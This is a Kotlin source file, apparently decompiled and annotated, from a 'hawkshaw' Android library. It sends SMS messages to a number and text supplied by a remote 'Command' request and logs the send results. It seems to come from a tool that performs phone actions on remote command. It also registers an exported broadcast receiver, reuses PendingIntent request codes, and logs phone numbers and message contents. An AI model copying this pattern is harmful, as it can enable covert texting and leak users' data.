package com.hawkshaw.library.features.telephony.messages

import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.telephony.SmsManager
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.logger.Logger
import kotlin.jvm.internal.Intrinsics // For K.n equivalent
import android.util.Log // Added for logging
import androidx.core.content.ContextCompat

object R3J {
    fun U(str: String?): Boolean {
        // It might be useful to log inside R3J.U if it were more complex,
        // but for a simple isNullOrBlank, logging at the call site is usually sufficient.
        // Log.d(TAG, "[DEBUG] R3J.U called with str: \"$str\"")
        return str.isNullOrBlank()
    }
}

private const val TAG = "SendMessage"
private const val SMS_SENT = "smsSent"
private const val SMS_DELIVERED = "smsDelivered"

/**
 * Creates a broadcast receiver for handling SMS send results
 * 
 * @param request The original send message request
 * @return Configured BroadcastReceiver
 */
private fun receiver(request: Command.SendMessageRequest): BroadcastReceiver {
    Log.d(TAG, "[DEBUG] receiver created for request: Number=${request.number}, Message (first 20 chars)='${request.message.take(20)}'")
    Intrinsics.checkNotNullParameter(request, "request")
    return object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.d(TAG, "[DEBUG] BroadcastReceiver onReceive triggered. Action: ${intent?.action}, ResultCode: $resultCode")
            val resultCode = resultCode
            // Existing Logger.d is good here, provides similar info to what a new [DEBUG] log would.
            Logger.d(TAG, "SMS sent result: $resultCode", false, 4, null)
            
            when (resultCode) {
                SmsManager.RESULT_ERROR_GENERIC_FAILURE ->
                    Logger.e(TAG, "Generic failure for ${request.number}", null, false, 12, null)
                SmsManager.RESULT_ERROR_NO_SERVICE ->
                    Logger.e(TAG, "No service for ${request.number}", null, false, 12, null)
                SmsManager.RESULT_ERROR_NULL_PDU ->
                    Logger.e(TAG, "Null PDU for ${request.number}", null, false, 12, null)
                SmsManager.RESULT_ERROR_RADIO_OFF ->
                    Logger.e(TAG, "Radio off for ${request.number}", null, false, 12, null)
                else ->
                    Logger.d(TAG, "SMS sent successfully to ${request.number}", false, 4, null)
            }
            
            Log.d(TAG, "[DEBUG] Unregistering BroadcastReceiver.")
            context?.unregisterReceiver(this)
        }
    }
}

/**
 * Sends a message using the appropriate method (RCS if available, fallback to SMS)
 * 
 * @param context Application context
 * @param request Send message request parameters
 */
fun sendMessage(context: Context, request: Command.SendMessageRequest) {
    Log.d(TAG, "[DEBUG] sendMessage called. Request: Number=${request.number}, Message (first 20 chars)='${request.message.take(20)}'")
    Intrinsics.checkNotNullParameter(context, "context")
    Intrinsics.checkNotNullParameter(request, "request")

    // Existing Logger.v is good for entry.
    Logger.v(TAG, "Send Message received", false, 4, null)

    val isMessageBlank = R3J.U(request.message)
    // The original code had R3J.U(request.message) twice. Assuming one was meant for request.number
    val isNumberBlank = R3J.U(request.number)
    Log.d(TAG, "[DEBUG] Validation: isMessageBlank=$isMessageBlank, isNumberBlank=$isNumberBlank")

    // Corrected the condition to check both message and number
    if (isMessageBlank || isNumberBlank) {
        Log.w(TAG, "[DEBUG] Message or number is blank. Request malformed: $request")
        Logger.e(TAG, "Message request malformed $request", null, false, 12, null)
        return
    }
    Log.d(TAG, "[DEBUG] Message and number are not blank. Proceeding.")

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        Log.d(TAG, "[DEBUG] SDK >= TIRAMISU. Registering receiver with RECEIVER_EXPORTED.")
        context.registerReceiver(receiver(request), IntentFilter(SMS_SENT), Context.RECEIVER_EXPORTED)
    } else {
        Log.d(TAG, "[DEBUG] SDK < TIRAMISU. Registering receiver without RECEIVER_EXPORTED.")
        ContextCompat.registerReceiver(
            context,
            receiver(request),
            IntentFilter(SMS_SENT),
            ContextCompat.RECEIVER_NOT_EXPORTED
        )
    }
    Log.d(TAG, "[DEBUG] BroadcastReceiver registered for SMS_SENT.")


    val smsManager = context.getSystemService(SmsManager::class.java) as SmsManager
    Log.d(TAG, "[DEBUG] SmsManager instance obtained.")

    val pendingIntentFlags = PendingIntent.FLAG_IMMUTABLE
    Log.d(TAG, "[DEBUG] PendingIntent flags set to: $pendingIntentFlags (FLAG_IMMUTABLE)")

    val sentIntent = PendingIntent.getBroadcast(
        context,
        0,
        Intent(SMS_SENT),
        pendingIntentFlags
    )
    Log.d(TAG, "[DEBUG] Sent PendingIntent created: $sentIntent")

    val deliveredIntent = PendingIntent.getBroadcast(
        context,
        0,
        Intent(SMS_DELIVERED),
        pendingIntentFlags
    )
    Log.d(TAG, "[DEBUG] Delivered PendingIntent created: $deliveredIntent")

    try {
        Log.d(TAG, "[DEBUG] Attempting to send SMS. Message length: ${request.message.length}")
        if (request.message.length > 160) {
            Log.d(TAG, "[DEBUG] Message length > 160. Sending as multipart message.")
            val parts = smsManager.divideMessage(request.message)
            Log.d(TAG, "[DEBUG] Message divided into ${parts.size} parts.")
            smsManager.sendMultipartTextMessage(
                request.number,
                null,
                parts,
                null,
                null
            )
            Log.d(TAG, "[DEBUG] sendMultipartTextMessage called for ${request.number}.")
        } else {
            Log.d(TAG, "[DEBUG] Message length <= 160. Sending as single part message.")
            smsManager.sendTextMessage(
                request.number,
                null,
                request.message,
                sentIntent,
                deliveredIntent
            )
            Log.d(TAG, "[DEBUG] sendTextMessage called for ${request.number}.")
        }
        // Existing Logger.d is good here.
        Logger.d(TAG, "SMS queued for sending to ${request.number}", false, 4, null)
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] Exception caught during SMS sending: ${e.message}", e) // Added for debug channel
        Logger.e(TAG, "Error sending SMS", e, false, 12, null)
    }
}
